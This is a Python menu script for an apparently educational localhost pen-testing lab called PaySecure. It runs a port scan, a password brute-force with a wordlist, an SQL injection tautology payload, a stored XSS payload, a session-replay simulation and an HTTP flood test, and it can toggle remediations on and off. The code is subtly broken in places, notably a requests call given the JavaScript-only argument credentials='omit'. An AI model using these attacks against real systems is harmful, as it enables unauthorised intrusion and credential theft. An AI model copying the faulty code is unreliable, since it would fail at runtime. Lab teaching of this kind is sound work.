import requests, socket, time, random, string, statistics, sys

BASE = "http://127.0.0.1:5000"
LOCAL_HOST = "127.0.0.1"
TIMEOUT = 4

def header(n, title, phase):
    print("\n" + "=" * 76)
    print(f"  ATTACK {n}: {title}")
    print(f"  Ethical Hacking Phase: {phase}")
    print("=" * 76)

def check_server():
    try:
        r = requests.get(f"{BASE}/health", timeout=2)
        if r.status_code == 200:
            return True
    except Exception:
        pass
    return False

def attack_1_port_scan():
    header(1, "NETWORK / PORT SCANNING", "Phase 1 & 2: Planning, Reconnaissance & Scanning")
    print(f"[*] Target Host : {LOCAL_HOST}")
    print(f"[*] Method      : Direct TCP connect socket probe")
    
    ports = [5000, 5001, 8000, 8080, 3306, 5432, 22]
    service_names = {
        5000: "Flask Web App", 5001: "Secondary Microservice", 8000: "HTTP-Alt Dev",
        8080: "HTTP Proxy", 3306: "MySQL DB", 5432: "PostgreSQL DB", 22: "SSH Management"
    }
    
    results = []
    print("\n  PORT   STATUS        LATENCY    SERVICE")
    print("  " + "-" * 54)
    
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.25)
        start = time.perf_counter()
        code = sock.connect_ex((LOCAL_HOST, port))
        elapsed = (time.perf_counter() - start) * 1000
        sock.close()
        
        state = "OPEN" if code == 0 else "CLOSED/FILTERED"
        svc = service_names.get(port, "Unknown")
        results.append((port, state, elapsed, svc))
        print(f"  {port:<6} {state:<13} {elapsed:6.2f} ms   {svc}")
        
    open_ports = [p for p, s, _, _ in results if s == "OPEN"]
    print(f"\n[+] Reconnaissance Result: {len(open_ports)}/{len(ports)} probed ports active.")
    print(f"[+] Finding: Exposed web service on port 5000. Low attack surface on standard DB ports.")

def attack_2_bruteforce():
    header(2, "PASSWORD BRUTE-FORCE / AUTHENTICATION ATTACK", "Phase 3: Controlled Exploitation")
    target_email = "student@paysecure.local"
    wordlist = ["123456", "password", "admin2026", "secret", "pay123", "secure2025", "paysecure123", "student123"]
    
    print(f"[*] Target Account : {target_email}")
    print(f"[*] Wordlist Size  : {len(wordlist)} candidates")
    print(f"[*] Endpoint Tested: POST {BASE}/login")
    print("\n  #   CANDIDATE        STATUS CODE  RESULT")
    print("  " + "-" * 54)
    
    started = time.perf_counter()
    for idx, pw in enumerate(wordlist, 1):
        try:
            r = requests.post(f"{BASE}/login", data={"email": target_email, "password": pw}, allow_redirects=False, timeout=TIMEOUT)
            if r.status_code == 302:
                elapsed = time.perf_counter() - started
                print(f"  {idx:<3} {pw:<16} HTTP 302     SUCCESS [MATCH FOUND]")
                print(f"\n[!] Vulnerability Confirmed: Weak password authentication without lockout.")
                print(f"[!] Cracked Credentials: {target_email} -> '{pw}' in {elapsed:.2f}s")
                return
            elif r.status_code == 429:
                print(f"  {idx:<3} {pw:<16} HTTP 429     BLOCKED [RATE LIMITED / LOCKED]")
                print(f"\n[+] Attack Blocked: Application rate limiting and lockout actively engaged.")
                return
            else:
                print(f"  {idx:<3} {pw:<16} HTTP {r.status_code}     FAILED")
        except Exception as e:
            print(f"  {idx:<3} Error: {e}")

def attack_3_sqli():
    header(3, "SQL INJECTION (SQLi)", "Phase 3: Controlled Exploitation")
    payload = "' OR 1=1 --"
    print(f"[*] Target Endpoint : GET {BASE}/products?q={payload}")
    print(f"[*] Injected String : {payload}")
    
    try:
        r = requests.post(f"{BASE}/api/security/sqli", json={"payload": payload}, timeout=TIMEOUT)
        data = r.json()
        
        print(f"\n[+] Query Executed on SQLite Database:")
        print(f"    {data.get('sql_executed')}")
        print(f"[+] Total Catalog Records Returned: {data.get('records_returned')}")
        print(f"[+] Result Status: {data.get('result_status')}")
        
        if data.get("result_status") == "EXPLOITED":
            print(f"\n[!] CRITICAL Finding: Query tautology bypassed filter; full product catalog dumped.")
            print(f"[!] Recommendation: Utilize parameterized queries with '?' placeholders.")
        else:
            print(f"\n[+] Parameterized Query Active: Injection payload treated as literal string; attack neutralized.")
    except Exception as e:
        print(f"[-] Error: {e}")

def attack_4_xss():
    header(4, "STORED CROSS-SITE SCRIPTING (XSS)", "Phase 3: Controlled Exploitation")
    payload = '<img src=x onerror="alert(\'XSS-EXPLOITED-PAYSECURE\')">'
    print(f"[*] Target Endpoint : POST{BASE}/products/1/reviews")
    print(f"[*] Script Payload  : {payload}")
    
    try:
        r = requests.post(f"{BASE}/api/security/xss", json={"payload": payload}, timeout=TIMEOUT)
        data = r.json()
        
        print(f"\n[+] Stored in SQLite Reviews Table: Review ID #{data.get('review_id')}")
        print(f"[+] Result Status: {data.get('result_status')}")
        
        if not data.get("mitigated"):
            print(f"\n[!] HIGH Risk Finding: Untrusted input rendered via '|safe' filter.")
            print(f"[!] Browser Context: Any customer viewing Product #1 will execute the script.")
        else:
            print(f"\n[+] Output Encoding Active: Input safely escaped via HTML entity encoding.")
    except Exception as e:
        print(f"[-] Error: {e}")

def attack_5_session_hijack():
    header(5, "SESSION HIJACKING & TOKEN REPLAY", "Phase 4: Maintaining Access")
    print(f"[*] Testing Endpoint: {BASE}/api/security/session-hijack")
    print(f"[*] Simulation: Adversary intercepts victim token and attempts replay from rogue IP.")
    
    try:
        r = requests.post(f"{BASE}/api/security/session-hijack", timeout=TIMEOUT)
        data = r.json()
        
        print(f"\n[+] Intercepted Token: {data.get('victim_token')}")
        print(f"[+] Attacker IP       : {data.get('attacker_ip')}")
        print(f"[+] Server Response   : {data.get('server_response')}")
        
        if data.get("hijack_success"):
            print(f"\n[!] CRITICAL Finding: Lack of client IP/fingerprint binding allowed unauthorized session takeover.")
        else:
            print(f"\n[+] Secure Session Active: Fingerprint mismatch detected; unauthorized replay blocked.")
    except Exception as e:
        print(f"[-] Error: {e}")

def attack_6_dos():
    header(6, "HTTP GET FLOOD / DENIAL-OF-SERVICE CONCEPT", "Phase 3: Controlled Exploitation")
    burst_count = 35
    print(f"[*] Target Endpoint : GET {BASE}/health")
    print(f"[*] Request Volume  : {burst_count} requests burst")
    
    try:
        r = requests.post(f"{BASE}/api/security/flood-test", timeout=TIMEOUT)
        data = r.json()
        
        print(f"\n[+] Burst Completed in: {data.get('total_time_ms')} ms")
        print(f"[+] Avg Latency       : {data.get('avg_latency_ms')} ms")
        print(f"[+] Max Latency       : {data.get('max_latency_ms')} ms")
        print(f"[+] Throttled (429)   : {data.get('throttled_count')} requests")
        
        if data.get("mitigated"):
            print(f"\n[+] Rate Limiting Active: Excess requests throttled with HTTP 429 Too Many Requests.")
        else:
            print(f"\n[!] Finding: Service processed all burst requests without throttling; potential latency saturation.")
    except Exception as e:
        print(f"[-] Error: {e}")

def toggle_remediation_cli():
    print("\n--- REMEDIATION SWITCHBOARD ---")
    print("1. Set ALL Vulnerabilities to VULNERABLE (Demonstration Mode)")
    print("2. Enable ALL Remediations (Protected Mode)")
    print("3. Toggle Individual Vulnerability")
    choice = input("Select option: ").strip()
    
    if choice == "1":
        requests.post(f"{BASE}/api/security/toggle-remediation", credentials="omit", json={"vuln_key": "ALL", "state": 0})
        print("[+] All vulnerabilities set to VULNERABLE.")
    elif choice == "2":
        requests.post(f"{BASE}/api/security/toggle-remediation", json={"vuln_key": "ALL", "state": 1})
        print("[+] All remediations ENABLED.")
    elif choice == "3":
        key = input("Enter vuln key (port_scan, brute_force, sqli, xss, session_hijack, dos): ").strip()
        requests.post(f"{BASE}/api/security/toggle-remediation", json={"vuln_key": key})
        print(f"[+] Toggled {key}.")

ATTACKS = [
    attack_1_port_scan,
    attack_2_bruteforce,
    attack_3_sqli,
    attack_4_xss,
    attack_5_session_hijack,
    attack_6_dos
]

def main():
    if not check_server():
        print("[-] Error: PaySecure application is not running at http://127.0.0.1:5000")
        print("    Please start the server first in Terminal 1 with: python app.py")
        sys.exit(1)
        
    print("=" * 76)
    print("  PAYSECURE CYBERSECURITY LAB — ETHICAL HACKING PEN-TESTING RUNNER")
    print("  Target: http://127.0.0.1:5000 | Scope: Localhost Only")
    print("=" * 76)
    print("\n  1. Network & Port Scanning (Reconnaissance)")
    print("  2. Password Brute-Force Authentication Test")
    print("  3. SQL Injection (SQLi)")
    print("  4. Stored Cross-Site Scripting (XSS)")
    print("  5. Session Hijacking & Token Replay")
    print("  6. HTTP GET Flood / DoS Concept")
    print("  A. Run ALL 6 Attack Demonstrations")
    print("  R. Toggle Remediation & Protections (Before/After)")
    print("  Q. Quit")
    
    choice = input("\nSelect an attack option (1-6, A, R, Q): ").strip().lower()
    
    if choice == "a":
        for fn in ATTACKS:
            try:
                fn()
                time.sleep(0.5)
            except Exception as e:
                print("ERROR:", e)
    elif choice in "123456":
        try:
            ATTACKS[int(choice) - 1]()
        except Exception as e:
            print("ERROR:", e)
    elif choice == "r":
        toggle_remediation_cli()
    elif choice == "q":
        print("Exiting simulator.")
    else:
        print("Invalid choice.")

if __name__ == "__main__":
    main()
